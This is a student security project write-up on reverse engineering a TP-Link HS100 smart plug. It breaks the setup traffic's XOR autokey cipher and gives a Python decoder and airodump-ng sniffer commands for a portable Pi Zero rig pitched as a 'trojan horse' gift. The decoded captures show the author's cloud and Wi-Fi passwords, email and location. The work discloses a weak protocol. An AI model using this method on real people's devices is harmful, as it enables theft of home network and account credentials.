# TP-Link HS100 Trojan Horse

This project was submitted as joint final project for my Security Lab (CS 460) and Independent Study (CS 397) at the University of Illinois Urbana - Champaign (UIUC). The intention of this project is to reverse engineer the function of a TP-Link Smart Wifi Plug (HS100) and utilize any findings.

Particularly, my goal for this project was to use the device as a trojan horse to recover credentials of the victim's home network. The victim would receive the device as a gift or prize from a "random" drawing. The adversary would then sniff network traffic during setup to obtain the Wi-Fi credentials. 

I was able to accomplish my primary goal, and obtained information which exceeded my initial expectations.

# Device Setup

Device setup is performed by the user with the Kasa smartphone app. The user is asked to create a TP-Link Cloud Account in order to control the smart plug from anywhere. If the user doesn't link a cloud account, the plug can only be controlled locally. Once the device is plugged in, it creates an open Wi-Fi network used for setup. Kasa then connects the user's smartphone to the plug's network and configures the device over Wi-Fi. 

I was able to capture this setup traffic using an Alfa AWUS036NH Wireless Adapter in monitor mode with airodump-ng. The only traffic was TCP traffic on port 9999. However, the transmitted data was not in plaintext. The application appears to encrypt or encode the TCP payload before transmission.

A port scan of the device showed 9999 as the only open port. 

# Attempted Reverse Engineering of Kasa

A copy of the latest Kasa APK was downloaded from   [APKMirror](https://www.apkmirror.com) and decompiled using [DEX2Jar](https://github.com/pxb1988/dex2jar). The resulting file was examined using [JD-GUI](https://github.com/java-decompiler/jd-gui) and [Luyten](https://github.com/deathmarine/Luyten). The goal was to isolate and analyze the section of the app that handled to device configuration in order to determine the method used for information encoding.

Naturally, the decompiled Java code was void of the original variable and function names. After spending a few days looking through functions and variables whose names were one character letters I had made next to no progress isolating any encoding function. I switched my focus to the network protocol.

# Reverse Engineering the Network Protocol

  
  

## Known Plaintext Attack

 After capturing device setup traffic multiple times, I started to notice identical packets across different pcaps. This led me to try a known plaintext attack by varying the device alias passed during setup. The user is asked to pick a name for the plug, with a default value of "My Smart Plug". I captured another pcap of device setup traffic with the alias of "My Smart Slug" to test my hypothesis. After painstackingly analyzing the TCP payload of the two captures, I was able to identify two packets with identical length and very similar structure.


"My Smart Plug" Capture

```diff 
00:00:00:36:d0:f2:81:f8:8b:ff:9a:f7:d5:ef:94:b6:c5:
a0:d4:8b:ef:8a:fc:a3:c2:ae:c7:a6:d5:f7:cd:b6:94:f5:
99:f0:91:e2:c0:fa:d8:95:ec:cc:9f:f2:93:e1:95:b5:
+e5:89:fc:9b:b9:c4:b9:c4
```


"My Smart Slug" Capture

```diff 
00:00:00:36:d0:f2:81:f8:8b:ff:9a:f7:d5:ef:94:b6:c5:
a0:d4:8b:ef:8a:fc:a3:c2:ae:c7:a6:d5:f7:cd:b6:94:f5:
99:f0:91:e2:c0:fa:d8:95:ec:cc:9f:f2:93:e1:95:b5:
-e6:8a:ff:98:ba:c7:ba:c7
```

One can clearly pinpoint the difference starts at e5 vs e6.
Given the two strings differ in Plug vs Slug, I assumed e5 is likely 'P' and e6 is likely 'S'. In ASCII, 'P' is 0x50 and 'S' is 0x53. If we try an XOR of the plaintext and the ciphertext, we should be able to recover the byte used originally.

  
```
0xe5 XOR 0x50 = 0xb5
0xe6 XOR 0x53 = 0xb5
```
  
 In both cases, the characters seem to be XOR'd with the ciphertext of the preceding byte. Continuing this process, we see the character before is a space (0xb5 XOR 0x95 = 0x20) and the character after is an 'l' ( 0x89 XOR 0xe5= 0x6c, as does 0x8a XOR 0xe6). Continuing this trend, we are able to decrypt the entire message except for the first few bytes, which decode to unprintable characters.
```
"system":{"set_dev_alias":{"alias":"My Smart Plug"}}}
```
Given that the structure of the command appears to be JSON, we can assume there should be one more '{' at the beginning of the string. Through some trial and error, the beginning XOR key was found to be 0xab (171 in decimal).
```
0xab XOR 0xd0 = 0x7c 	ASCII for '{'
```
I was not able to find what the first four bytes 00:00:00:36 were used for in this message.

# Decoding network traffic

With the algorithm figured out, I was able to write a quick python script to decode a TCP packet. In order to avoid any ambiguity about which beginning bytes to ignore, I chose to decode the string backwards due to my knowledge of the command format.

```
def  decode(pkt):
	s =  str(pkt[TCP].payload)[::-1]
	ret =  ""
	for i in range(len(s)):
		if i +  1  <  len(s):
			c =  chr(ord(s[i]) ^  ord(s[i+1]))
			ret = c + ret
	begin = ret.find('\"')
	ret =  '{'  + ret[begin:]
	if ret.find('}') >  -1:
		print ret
	return ret
```
  
 
Utilizing the Scapy module, I was able to parse an entire pcap file and decode all configuration messages sent over TCP or UDP.

# Sniffing Device Setup with Pi Zero

  ![Image of Sniffer](https://i.imgur.com/8R2PgRk.jpg=250x)

Raspberri Pi Zero W running Kali with [Re4son’s Pi-Tail](https://whitedome.com.au/re4son/pi-tail/)
Alfa AWUS036NH Wireless Adapter
External Battery Pack

Roughly 20s after receiving power, the setup begins sniffing for HS100 networks used for device setup with the following startup script:
```
airmon-ng start wlan1
airmon-ng check kill
airodump-ng wlan1mon -c 1 --essid-regex Plug -w scan_results
```

The provided ESSID capture filter will include all HS100 networks, however it could also capture extra packets depending on the surrounding networks. The regex filter can be furthered refined if necessary.

This setup is capable of capturing multiple device setups, so long as the battery pack has power. I encountered some issues with my antenna with receiving every packet, however the capture worked extremely well when the sniffer was between the path between the plug and the phone. I imagine the problem would be non-existent with a better antenna.


Below is my best decoded packet capture with this setup. 
Note: some duplicate information from retransmitted packets was removed using uniq.
```
{"system":{"get_sysinfo":{}}}
{"system":{"get_sysinfo":{"err_code":0,"sw_ver":"1.2.5 Build 171129 Rel.174814","hw_ver":"1.0","type":"IOT.SMARTPLUGSWITCH","model":"HS100(US)","mac":"50:C7:BF:5B:57:7E","deviceId":"8006CA44F6E7658EABC6D2CD45B6DB46186BDA47","hwId":"5EACBE93FB9E32ECBE1F1C2ADE6DDE11","fwId":"00000000000000000000000000000000","oemId":"37589AA1F5CACDC53E2914B7760127E5","alias":"TP-LINK_Smart Plug_577E","dev_name":"Wi-Fi Smart Plug","icon_hash":"","relay_state":1,"on_time":56,"active_mode":"none","feature":"TIM","updating":0,"led_off":0,"latitude":0,"longitude":0}}}
{"cnCloud":{"get_info":{}}}
{"cnCloud":{"get_info":{"username":"sschrock17@gmail.com","server":"devs.tplinkcloud.com","binded":0,"cld_connection":0,"illegalType":-1,"stopConnect":-1,"tcspStatus":-1,"fwDlPage":"","tcspInfo":"","fwNotifyType":0,"err_code":0}}}
{"time":{"set_timezone":{"hour":18,"index":13,"mday":1,"min":13,"month":5,"sec":49,"year":2018}}}
{"time":{"set_timezone":{"err_code":0}}}
{"system":{"set_dev_location":{"latitude":34.73994075,"latitude_i":347399,"longitude":-86.68234742,"longitude_i":-866823}}}
{"system":{"set_dev_location":{"err_code":0}}}
{"cnCloud":{"set_server_url":{"server":"devs.tplinkcloud.com"}}}
{"cnCloud":{"set_server_url":{"err_code":0}}}
{"cnCloud":{"set_sefserver_url":{"server":"deventry.tplinkcloud.com"}}}
{"cnCloud":{"set_sefserver_url":{"err_code":-2,"err_msg":"member not support"}}}
{"schedule":{"set_overall_enable":{"enable":1}}}
{"schedule":{"set_overall_enable":{"err_code":0}}}
{"time":{"set_timezone":{"index":13}}}
{"time":{"set_timezone":{"err_code":-3,"err_msg":"invalid argument"}}}
{"system":{"set_dev_location":{"latitude":34.73994075,"latitude_i":347399,"longitude":-86.68234742,"longitude_i":-866823}}}
{"system":{"set_dev_location":{"err_code":0}}}
{"system":{"set_dev_alias":{"alias":"Living Room Plug"}}}
{"system":{"set_dev_alias":{"err_code":0}}}
{"cnCloud":{"bind":{"password":"asupersecretpassword","username":"sschrock17@gmail.com"}}}
{"cnCloud":{"bind":{"err_code":-21,"err_msg":"can not connect to the server"}}}
{"netif":{"get_scaninfo":{"refresh":0}}}
{"netif":{"get_scaninfo":{"ap_list":[{"ssid":"2.4 1106STO-U2C","key_type":2},{"ssid":"Bankier-WiFi","key_type":0},{"ssid":"BunnyA","key_type":2},{"ssid":"CableWiFi","key_type":0},{"ssid":"GuessWhoIAm","key_type":3},{"ssid":"HCYHouse","key_type":3},{"ssid":"House wifi","key_type":3},{"ssid":"NETGEAR19","key_type":3},{"ssid":"NETGEAR88","key_type":3},{"ssid":"TP-Link_3B22","key_type":3},{"ssid":"TP-LINK_553E","key_type":2},{"ssid":"TP-LINK_56993C","key_type":2},{"ssid":"VIDEO","key_type":2},{"ssid":"Winternet is Coming","key_type":3},{"ssid":"XFINITY","key_type":3},{"ssid":"xfinitywifi","key_type":0},{"ssid":"xfinitywifi","key_type":0},{"ssid":"xfinitywifi","key_type":0}],"err_code":0}}}
{"netif":{"set_stainfo":{"key_type":3,"password":"fireandblood","ssid":"Winternet is Coming"}}}
{"netif":{"set_stainfo":{"mac":"50:C7:BF:5B:57:7E","err_code":0}}}
```

Note the following information:
```
{"cnCloud":{"bind":{"password":"asupersecretpassword","username":"sschrock17@gmail.com"}}}
{"netif":{"set_stainfo":{"key_type":3,"password":"fireandblood","ssid":"Winternet is Coming"}}}
```

The credentials to my TP-Link Cloud Account and my Wifi Network are easily recovered from the network capture. 

# Enumerating commands

  With the encryption algorithm known, I began capturing traffic related to functions available in the Kasa App. This process was painstaking because the plugs cannot be used on an open wifi network. I found this ironic, give that the device setup occurs over an open wifi network.
  
Therefore I had to use Wireshark to decrypt the WPA2 traffic for my network and copy and paste the TCP payloads into my script for decoding. The following list is non-exhaustive.

Get System Info 
```
{"system":{"get_sysinfo":{}}}
```

Reset the device
```
{"system":{"reset":{"delay":1}}}
```
Turn the plug on
```
{"system":{"set_relay_state":{"state":1}}}
```

Turn the plug off
```
{"system":{"set_relay_state":{"state":0}}}
```

Turn off the plug's LED (Night mode)
```
{"system":{"set_led_off":{"off":1}}}
```
Rename the device
```
{"system":{"set_dev_alias":{"alias":"New name here"}}}
```


Get Cloud Info (Server, Username, Connection Status)
```
{"cnCloud":{"get_info":{}}}
```

Connect with new cloud account
```
{"cnCloud":{"bind":{"username":"some@email.com", "password":"yourpass"}}}
```
Logout device from cloud
```
{"cnCloud":{"unbind":{}}}
```


Add new timer (countdown)
Delay is time in seconds
Act is 1 to turn device on after delay, or 0 to turn off.
```
{"count_down":{"add_rule":{"enable":1,"delay":60,"act":1,"name":"rule name"}}}
```
# Controlling Plugs with Computer

# Conclusion

The device setup information is encrypted using an [autokey cipher](https://en.wikipedia.org/wiki/Autokey_cipher). This cipher was broken with a known plaintext attack, which allowed for all configuration information to be decoded.
  
 The credentials to a user's TP-Link Cloud Account and a user's home Wifi network are easily captured, and can be done with a portable Pi Zero W setup.

## Authors

*  **Spencer Schrock**